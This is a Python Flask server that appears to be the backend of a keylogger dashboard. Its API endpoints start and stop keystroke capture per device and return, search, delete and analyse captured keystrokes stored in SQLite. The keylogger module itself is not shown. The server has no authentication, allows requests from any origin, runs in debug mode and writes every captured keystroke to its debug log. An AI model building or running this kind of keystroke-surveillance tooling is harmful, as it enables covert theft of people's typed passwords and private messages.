from flask import Flask, jsonify, send_from_directory, request
from flask_cors import CORS
import os
from keylogger2 import KeyLogger
import uuid
from datetime import datetime
import logging
import sqlite3
from analytics import Analytics
from werkzeug.exceptions import HTTPException

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder='static')
CORS(app)

# Initialize keylogger with SQLite database
db_path = os.path.join(os.path.dirname(__file__), 'keystrokes.db')
keylogger = KeyLogger(db_path)

# Initialize analytics
analytics = Analytics(keylogger.db_path)

# Store connected devices in memory (in production, use a database)
connected_devices = {}

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/logs')
def get_logs():
    try:
        device_id = request.args.get('device')
        logger.debug(f"Fetching logs for device: {device_id}")
        
        # Debug: Check DB contents
        conn = sqlite3.connect(keylogger.db_path)
        c = conn.cursor()
        c.execute("SELECT * FROM keystrokes")
        all_rows = c.fetchall()
        logger.debug(f"Total rows in DB: {len(all_rows)}")
        for row in all_rows:
            logger.debug(f"DB Row: {row}")
        conn.close()
        
        # Get logs from keylogger
        logs = keylogger.get_logs(device_id)
        logger.debug(f"Retrieved logs: {logs}")
        
        # Convert logs to array if it's a string
        if isinstance(logs, str):
            logs = logs.split('\n')
        
        # Return as JSON with proper formatting
        return jsonify({
            "logs": logs if logs else []
        })
    except Exception as e:
        logger.error(f"Error getting logs: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/devices')
def get_devices():
    return jsonify([])  # Return empty list initially

@app.route('/api/devices/connect', methods=['POST'])
def connect_device():
    device_id = str(uuid.uuid4())[:8]
    return jsonify({
        'id': device_id,
        'name': f'Device-{device_id}',
        'status': 'connected'
    })

@app.route('/api/devices/<device_id>', methods=['DELETE'])
def remove_device(device_id):
    try:
        logger.debug(f"Removing device: {device_id}")
        
        # Stop keylogger if running
        keylogger.stop_logging()
        
        # Remove device's logs from database
        conn = sqlite3.connect(keylogger.db_path)
        c = conn.cursor()
        c.execute("DELETE FROM keystrokes WHERE device_id = ?", (device_id,))
        conn.commit()
        conn.close()
        
        logger.debug(f"Device {device_id} removed successfully")
        
        return jsonify({
            "message": f"Device {device_id} removed successfully",
            "device_id": device_id
        })
        
    except Exception as e:
        logger.error(f"Error removing device: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/keylogger/<device_id>/start', methods=['POST'])
def start_keylogger(device_id):
    try:
        logger.debug(f"Starting keylogger for device {device_id}")
        result = keylogger.start_logging(device_id)
        logger.debug(f"Start result: {result}")
        return jsonify({"message": result})
    except Exception as e:
        logger.error(f"Error starting keylogger: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/keylogger/<device_id>/stop', methods=['POST'])
def stop_keylogger(device_id):
    try:
        logger.debug(f"Stopping keylogger for device {device_id}")
        result = keylogger.stop_logging()
        logger.debug(f"Stop result: {result}")
        return jsonify({"message": result})
    except Exception as e:
        logger.error(f"Error stopping keylogger: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/keylogger/clear', methods=['POST'])
def clear_logs():
    result = keylogger.clear_logs()
    return jsonify({'message': result})

@app.route('/api/logs/history', methods=['POST'])
def get_logs_history():
    try:
        data = request.json
        date = data.get('date')
        time = data.get('time')
        
        logger.debug(f"Fetching logs history for date: {date}, time: {time}")
        
        conn = sqlite3.connect(keylogger.db_path)
        c = conn.cursor()
        
        query = "SELECT timestamp, device_id, content FROM keystrokes WHERE 1=1"
        params = []
        
        if date:
            query += " AND timestamp LIKE ?"
            params.append(f"{date}%")
        
        if time:
            query += " AND timestamp LIKE ?"
            params.append(f"%{time}%")
            
        query += " ORDER BY timestamp DESC"
        
        c.execute(query, params)
        rows = c.fetchall()
        conn.close()
        
        logger.debug(f"Found {len(rows)} history entries")
        
        result = []
        for timestamp, device_id, content in rows:
            log_entry = {
                "timestamp": timestamp,
                "device": f"Device-{device_id}",
                "content": content
            }
            result.append(log_entry)
        
        return jsonify({"history": result})
        
    except Exception as e:
        logger.error(f"Error getting logs history: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/analytics')
def get_analytics():
    try:
        device_id = request.args.get('device')
        days = int(request.args.get('days', 7))
        stats = analytics.get_stats(device_id, days)
        
        if stats:
            return jsonify(stats)
        return jsonify({"error": "Could not fetch analytics"}), 500
        
    except Exception as e:
        logger.error(f"Error in analytics endpoint: {e}")
        return jsonify({"error": str(e)}), 500

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST')
    return response

@app.errorhandler(404)
def page_not_found(e):
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 - Page Not Found</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
        <style>
            body {
                font-family: 'Arial', sans-serif;
                background: #1a1a1a;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #fff;
            }
            
            .error-container {
                background: #2a2a2a;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                max-width: 600px;
                width: 90%;
                text-align: center;
            }
            
            h1 {
                font-size: 72px;
                margin: 0;
                color: #007bff;
                text-shadow: 0 0 10px rgba(0,123,255,0.3);
            }
            
            .error-code {
                font-size: 24px;
                color: #999;
                margin: 10px 0;
                font-family: monospace;
            }
            
            .error-message {
                color: #ccc;
                margin: 20px 0;
                line-height: 1.6;
            }
            
            .home-link {
                display: inline-block;
                padding: 12px 24px;
                background: #007bff;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                transition: all 0.3s;
                font-weight: bold;
                margin-top: 20px;
            }
            
            .home-link:hover {
                background: #0056b3;
                transform: translateY(-2px);
                box-shadow: 0 4px 15px rgba(0,123,255,0.4);
            }
            
            .keyboard-art {
                font-family: monospace;
                margin: 30px 0;
                color: #007bff;
                font-size: 18px;
                line-height: 1.4;
            }
            
            .blink {
                animation: blink 1s infinite;
            }
            
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0; }
            }
            
            .error-details {
                font-family: monospace;
                color: #666;
                margin-top: 20px;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="error-container">
            <h1>404</h1>
            <div class="error-code">Key Not Found</div>
            <div class="keyboard-art">
                ⌨️ ERROR_KEY_NOT_FOUND ⌨️
                <br>
                <span class="blink">_</span>
            </div>
            <div class="error-message">
                Oops! Looks like we couldn't log this key.<br>
                The page you're trying to access doesn't exist in our keylog database.
            </div>
            <a href="/" class="home-link">
                <i class="fas fa-keyboard"></i> Back to Dashboard
            </a>
            <div class="error-details">
                [timestamp: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """]
            </div>
        </div>
    </body>
    </html>
    """, 404

@app.errorhandler(Exception)
def handle_exception(e):
    # Pass through HTTP errors
    if isinstance(e, HTTPException):
        return e

    # Now handle non-HTTP exceptions
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>500 - Internal Server Error</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
        <style>
            body {
                font-family: 'Arial', sans-serif;
                background: #1a1a1a;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                color: #fff;
            }
            
            .error-container {
                background: #2a2a2a;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                max-width: 600px;
                width: 90%;
                text-align: center;
            }
            
            h1 {
                font-size: 72px;
                margin: 0;
                color: #dc3545;
                text-shadow: 0 0 10px rgba(220,53,69,0.3);
            }
            
            .error-code {
                font-size: 24px;
                color: #999;
                margin: 10px 0;
                font-family: monospace;
            }
            
            .error-message {
                color: #ccc;
                margin: 20px 0;
                line-height: 1.6;
            }
            
            .home-link {
                display: inline-block;
                padding: 12px 24px;
                background: #dc3545;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                transition: all 0.3s;
                font-weight: bold;
                margin-top: 20px;
            }
            
            .home-link:hover {
                background: #bb2d3b;
                transform: translateY(-2px);
                box-shadow: 0 4px 15px rgba(220,53,69,0.4);
            }
            
            .error-art {
                font-family: monospace;
                margin: 30px 0;
                color: #dc3545;
                font-size: 18px;
                line-height: 1.4;
            }
            
            .blink {
                animation: blink 1s infinite;
            }
            
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0; }
            }
            
            .error-details {
                font-family: monospace;
                color: #666;
                margin-top: 20px;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="error-container">
            <h1>500</h1>
            <div class="error-code">Internal Server Error</div>
            <div class="error-art">
                ⚠️ BUFFER_OVERFLOW ⚠️
                <br>
                <span class="blink">_</span>
            </div>
            <div class="error-message">
                Oops! Our keylogger encountered an unexpected error.<br>
                Don't worry, no keystrokes were harmed in the process.
            </div>
            <a href="/" class="home-link">
                <i class="fas fa-sync"></i> Retry Connection
            </a>
            <div class="error-details">
                [timestamp: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """]
            </div>
        </div>
    </body>
    </html>
    """, 500

@app.route('/test500')
def test_500():
    raise Exception("This is a test 500 error!")

if __name__ == '__main__':
    # Initialize log file if it doesn't exist
    if not os.path.exists(db_path):
        with open(db_path, 'w') as f:
            f.write("")
        logger.debug("Created new log file")
    
    app.run(debug=True, port=5000)
        
        